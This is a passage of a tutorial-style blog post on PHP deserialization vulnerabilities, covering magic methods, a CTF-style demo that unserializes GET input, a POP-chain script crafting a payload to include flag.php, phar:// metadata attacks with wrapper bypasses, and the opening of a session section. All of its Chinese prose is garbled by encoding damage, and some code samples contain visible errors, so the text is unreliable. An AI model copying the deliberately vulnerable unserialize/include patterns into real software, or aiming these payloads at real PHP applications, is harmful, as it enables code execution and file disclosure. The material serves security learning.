        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><ul><li>åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬åŒ–ä¸ºæ•°æ®å­—èŠ‚æµï¼Œååºåˆ—åŒ–æ˜¯å°†æ•°æ®å­—èŠ‚æµè½¬æ¢æˆå¯¹è±¡ã€‚ä¾‹å¦‚javaé‡‡ç”¨äºŒè¿›åˆ¶åºåˆ—ï¼ŒPHPé‡‡ç”¨å¯è§å­—ç¬¦ä¸²åºåˆ—ã€‚</li><li>PHPååºåˆ—åŒ–æ¼æ´ä¸»è¦å‘ç”Ÿåœ¨ååºåˆ—åŒ–æœŸé—´ä¸€äº›é­”æœ¯æ–¹æ³•çš„è‡ªåŠ¨è°ƒç”¨ä¸Š</li></ul><h1 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h1><h2 id="éç±»åºåˆ—åŒ–"><a href="#éç±»åºåˆ—åŒ–" class="headerlink" title="éç±»åºåˆ—åŒ–"></a>éç±»åºåˆ—åŒ–</h2><p>ç›¸æ¯”äºç±»åºåˆ—åŒ–å°‘äº†å¯¹è±¡åé•¿åº¦å’Œå¯¹è±¡åç§°</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>\n&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>=&gt;<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span></span><br><span class="line">&gt;&gt;a:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;i:<span class="number">1</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;i:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç±»åºåˆ—åŒ–"><a href="#ç±»åºåˆ—åŒ–" class="headerlink" title="ç±»åºåˆ—åŒ–"></a>ç±»åºåˆ—åŒ–</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    pubilc <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        this-&gt;name = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220620212404834.png" alt="image-20220620212404834"></p><blockquote><p>å¯ä»¥å‘ç°åºåˆ—åŒ–æ—¶åªä¼šåºåˆ—åŒ–ç±»çš„å±æ€§ï¼Œè€Œä¸ä¼šåºåˆ—åŒ–ç±»çš„æ–¹æ³•ã€‚</p></blockquote><h3 id="ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“"><a href="#ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“" class="headerlink" title="ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“"></a>ç±»å±æ€§æƒé™å¯¹åºåˆ—åŒ–çš„å½±å“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span>=<span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">info</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;O:<span class="number">4</span>:<span class="string">&quot;info&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;i:<span class="number">19</span>;s:<span class="number">4</span>:<span class="string">&quot;*b&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;infoc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä»”ç»†è§‚å¯Ÿä¼šå‘ç°protectedå’Œprivateå˜é‡åºåˆ—åŒ–åå˜é‡åé•¿åº¦å‘ç”Ÿäº†å˜åŒ–</p><ul><li><p>s:4:â€*bâ€;</p></li><li><p>s:7:â€infocâ€</p><p>æˆ‘ä»¬ç”¨010æ‰“å¼€1.txt</p><p><img src="/../images/image-20220714122008106.png" alt="image-20220714122008106"></p></li></ul><p>â€‹å¯ä»¥å‘ç°protectedåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00*%00</p><p>â€‹è€Œprivateåºåˆ—åŒ–åï¼Œä¼šåœ¨å˜é‡åå‰åŠ ä¸Š%00ç±»å%00</p><blockquote><p>åœ¨å®é™…è¿ç”¨ä¸­å¯ä»¥ç”¨\00ï¼ˆ<code>ç©º</code>ï¼‰ç”¨%00ä»£æ›¿</p><p>åŸå› ï¼šphpçš„<code>urlencode()</code>ä¼šè‡ªåŠ¨æŠŠ<code>ç©º</code>ç¼–ç æˆ%00</p></blockquote><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP: é­”æœ¯æ–¹æ³• - Manual</a></p><h3 id="å¸¸è§"><a href="#å¸¸è§" class="headerlink" title="å¸¸è§"></a>å¸¸è§</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç±»çš„æ„é€ å‡½æ•°ï¼Œåˆ›å»ºç±»å¯¹è±¡æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç±»çš„ææ„å‡½æ•°ï¼Œå¯¹è±¡é”€æ¯æ—¶è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨constructå‡½æ•°</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œä¼šå…ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œå†è°ƒç”¨destructå‡½æ•°</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">å½“è°ƒç”¨çš„æ–¹æ³•ä¸å­˜åœ¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="comment">$name: è¢«è°ƒç”¨æ–¹æ³•çš„åå­—</span></span><br><span class="line"><span class="comment">$argumentsï¼šä¼ é€’ç»™è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">array</span> <span class="variable">$arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶</span></span><br><span class="line"><span class="comment">1.è¾“å‡ºå¯¹è±¡ï¼šecho/printç­‰ </span></span><br><span class="line"><span class="comment">2.å‡½æ•°çš„å‚æ•°ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œå°†å¯¹è±¡ä½œä¸ºå‚æ•°æ—¶</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br></pre></td></tr></table></figure><ul><li><p>__invoke()</p><p>å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³•&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="comment">#ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡</span></span><br><span class="line"><span class="variable">$a</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;è§¦å‘äº†ivokeé­”æœ¯æ–¹æ³•</span><br></pre></td></tr></table></figure></li><li><p>ä¸å¯è®¿é—®ï¼ˆprotected æˆ– privateï¼‰æˆ–ä¸å­˜åœ¨çš„å±æ€§</p><p>èµ‹å€¼æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è¯»å–æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.isset.php">isset()</a> æˆ– <a href="https://www.php.net/manual/zh/function.empty.php">empty()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p><p>è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.unset.php">unset()</a> æ—¶ï¼Œ<a href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a> ä¼šè¢«è°ƒç”¨ã€‚</p></li><li><p>å…¶ä»–</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__set_state</span>()ï¼Œè°ƒç”¨<span class="title function_ invoke__">var_export</span>()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__clone</span>()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__autoload</span>()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__debugInfo</span>()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯</span><br></pre></td></tr></table></figure></li></ul><h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>æœ‰åºåˆ—åŒ–å°±æœ‰ååºåˆ—åŒ–ï¼Œæ¼æ´ç‚¹å°±äº§ç”Ÿäºååºåˆ—åŒ–æ—¶ã€‚</p><p>å› ä¸ºåºåˆ—åŒ–æ•°æ®ä¸­å­˜å‚¨çš„æ˜¯ç±»å¯¹è±¡çš„å±æ€§ï¼Œå¦‚æœæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„é€ æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œæ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œ<strong>è¦†ç›–å˜é‡</strong>ï¼Œè¿›è€Œå¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQL æ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ol><li><p>å®šä½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä»£ç ï¼Œæ‰¾åˆ°å¯æ§å‚æ•°å’Œååºåˆ—åŒ–å¯¹è±¡</p></li><li><p>æ˜ç¡®è¦åˆ©ç”¨çš„æ–¹æ³•å’Œå±æ€§</p></li><li><p>æ ¹æ®å…¶æ‰€åœ¨ç±»çš„é­”æœ¯æ–¹æ³•æ„é€ popé“¾ï¼ˆä¼ å…¥å‚æ•°åˆ°è§¦å‘å…³é”®å‡½æ•°,æ³¨æ„ç±»å±æ€§çš„ç±»å‹ï¼‰</p><p>åœ¨ PHP7.2+çš„ç¯å¢ƒä¸­ï¼Œä½¿ç”¨ public ä¿®é¥°æˆå‘˜å¹¶åºåˆ—åŒ–ï¼Œååºåˆ—åŒ–åæˆå‘˜ä¹Ÿä¼šè¢« public è¦†ç›–ä¿®é¥°ã€‚</p></li><li><p>ä¼ é€’æ„é€ å¥½çš„åºåˆ—åŒ–å†…å®¹(æœ€å¥½è¦urlencodeä¸€ä¸‹)ï¼Œè§¦å‘ååºåˆ—åŒ–ï¼Œå®Œæˆæ”»å‡»</p></li></ol><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$name</span>.<span class="variable language_">$this</span>-&gt;flag);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;<span class="comment">//flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›®çš„æ˜¯è¦è§¦å‘ __get() è¿™ä¸ªå‡½æ•°ï¼Œé­”æœ¯æ–¹æ³•__get()ä¼šåœ¨ç”±å¤–éƒ¨è®¿é—®å¯¹è±¡ä¸­çš„ç§æœ‰å±æ€§æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œå…¶ä¸­å‚æ•°ä¼ªè®¿é—®å±æ€§çš„å±æ€§åã€‚å†è§‚å¯Ÿexampleè¿™ä¸ªç±»ï¼Œè¿™é‡Œå‘ç° __toStrong() æ–¹æ³•ï¼Œè€Œåˆå­˜åœ¨ <code>echo $a</code> è¿™å¥ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šè¦æ„é€ çš„è¿™ä¸ª $a å°±æ˜¯ exampleè¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œè€Œä¸”è¿™ä¸ªå¯¹è±¡ä¸­çš„å±æ€§ $flag ä¹Ÿåº”ä¸º get è¿™ä¸ªç±»çš„å¯¹è±¡ï¼Œä»è€Œ æ‰§è¡Œ <code>return $this-&gt;str-&gt;flag</code>æ—¶å°±ä¼šè·³è½¬åˆ° get å¯¹è±¡çš„ é­”æœ¯æ–¹æ³• __get($name) ï¼ˆ$nameä¸ºè¦è®¿é—®çš„ç§æœ‰å±æ€§çš„åç§°ï¼Œå³ flag è¿™ä¸ªå±æ€§åï¼‰ã€‚ä¹‹åè¦ include <code>&#39;flag.php&#39;</code>ï¼Œç”±äº$name &#x3D;&#x3D; flagï¼Œæ‰€ä»¥è¦æ„é€  $flag &#x3D;&#x3D; â€˜.phpâ€™ ï¼Œæ‹¼æ¥èµ·æ¥å°±å¯ä»¥åŒ…å« â€˜flag.phpâ€™ ä»è€Œæ‹¿åˆ°flagã€‚</p><p>å³</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">example</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">get</span>(<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h1 id="pharååºåˆ—åŒ–â€“PHP-lt-8"><a href="#pharååºåˆ—åŒ–â€“PHP-lt-8" class="headerlink" title="pharååºåˆ—åŒ–â€“PHP&lt;8"></a>pharååºåˆ—åŒ–â€“PHP&lt;8</h1><h2 id="pharæ˜¯ä»€ä¹ˆ"><a href="#pharæ˜¯ä»€ä¹ˆ" class="headerlink" title="pharæ˜¯ä»€ä¹ˆ"></a>pharæ˜¯ä»€ä¹ˆ</h2><ol><li><p>åŠŸèƒ½ï¼šå‹ç¼©æ–‡ä»¶ï¼Œå°†å†…å®¹åºåˆ—åŒ–å­˜å‚¨</p></li><li><p>å¦‚ä½•ç”Ÿæˆï¼š</p><blockquote><p>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„phar.readonlyé€‰é¡¹è®¾ç½®ä¸ºOff,å¹¶åˆ é™¤å‰é¢çš„;å¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;khaz&#x27;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶åä¸ºtest.phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>æ–‡ä»¶æ ¼å¼</p><p>ç”¨010æ‰“å¼€ç”Ÿæˆçš„test.pharï¼Œè§‚å¯Ÿpharæ–‡ä»¶çš„å››ä¸ªç»„æˆéƒ¨åˆ†</p></li></ol><p><img src="/../images/image-20220708184054295.png" alt="image-20220708184054295"></p><p>â€‹    å…³æ³¨stubå’Œmanifest</p><p>â€‹stubï¼špharè¯†åˆ«æ ‡å¿—ï¼Œåªè¦æœ‰äº†è¿™ä¸ªè¯†åˆ«æ ‡å¿—ï¼Œ<strong>å³ä½¿åç¼€åä¸ä¸ºpharï¼Œphpä»èƒ½å¤Ÿå°†æ–‡ä»¶è¯†åˆ«ä¸ºpharæ–‡ä»¶</strong></p><p>â€‹manifestï¼šè¿™ä¸€éƒ¨åˆ†æ˜¯æˆ‘ä»¬å¯æ§çš„åœ°æ–¹ï¼Œæ˜¯ååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹</p><p>â€‹    signatureï¼šå½“æˆ‘ä»¬éœ€è¦æ”¹å˜pharæ–‡ä»¶å†…å®¹æ—¶ï¼Œéœ€è¦é‡æ–°ç”Ÿæˆç­¾å</p><p>â€‹     </p><h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><ol><li><p>pharä¸­manifestæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„</p></li><li><p>phpä¸€å¤§éƒ¨åˆ†çš„<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–</strong>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">#test.pharæ˜¯ä¸Šé¢ç”Ÿæˆä»£ç ç”Ÿæˆçš„</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&quot;phar://test.phar&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>   <img src="/../images/image-20220708185428364.png" alt="image-20220708185428364"></p><p>3.å—åˆ°å½±å“çš„å‡½æ•°</p><p>From <a href="https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0">https://blog.zsxsoft.com/post/38?from=timeline&amp;isappinstalled=0</a></p><p><img src="/../images/image-20220714125317293.png" alt="image-20220714125317293"></p><p>â€‹</p></li></ol><p></p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ol><li><p>ç»•è¿‡pharå¼€å¤´</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line"></span><br><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure></li><li><p>ç»•è¿‡pharæ ‡è¯†ç¬¦<code>&lt;?php __HALT_COMPILER(); ?&gt;</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gzip phar.phar #ä½¿ç”¨å‹ç¼©åpharæ–‡ä»¶åŒæ ·ä¹Ÿèƒ½ååºåˆ—åŒ–</span><br></pre></td></tr></table></figure></li><li><p>ç­¾åä¿®æ”¹</p></li></ol><h1 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h1><p><a href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p><h2 id="sessionå·¥ä½œæµç¨‹"><a href="#sessionå·¥ä½œæµç¨‹" class="headerlink" title="sessionå·¥ä½œæµç¨‹"></a>sessionå·¥ä½œæµç¨‹</h2><p><img src="/../images/20191026142328-1fba974c-f7b9-1-1685604427875.png" alt="20191026142328-1fba974c-f7b9-1"></p><h2 id="sessionåºåˆ—åŒ–"><a href="#sessionåºåˆ—åŒ–" class="headerlink" title="sessionåºåˆ—åŒ–"></a>sessionåºåˆ—åŒ–</h2><p><code>PHP session</code>çš„å­˜å‚¨æœºåˆ¶æ˜¯ç”±<code>session.serialize_handler</code>æ¥å®šä¹‰å¼•æ“çš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ï¼Œä¸”å­˜å‚¨çš„æ–‡ä»¶æ˜¯ç”±<code>sess_sessionid</code>æ¥å†³å®šæ–‡ä»¶åçš„ã€‚</p><blockquote><p>é€šå¸¸æ–‡ä»¶åä¸ºsess_sessionidçš„å½¢å¼ï¼Œé»˜è®¤çš„å¼•æ“æ˜¯php</p></blockquote><p><img src="/../images/image-20220730213222612.png" alt="image-20220730213222612"></p><h2 id="äº§ç”Ÿçš„åŸå› "><a href="#äº§ç”Ÿçš„åŸå› " class="headerlink" title="äº§ç”Ÿçš„åŸå› "></a>äº§ç”Ÿçš„åŸå› 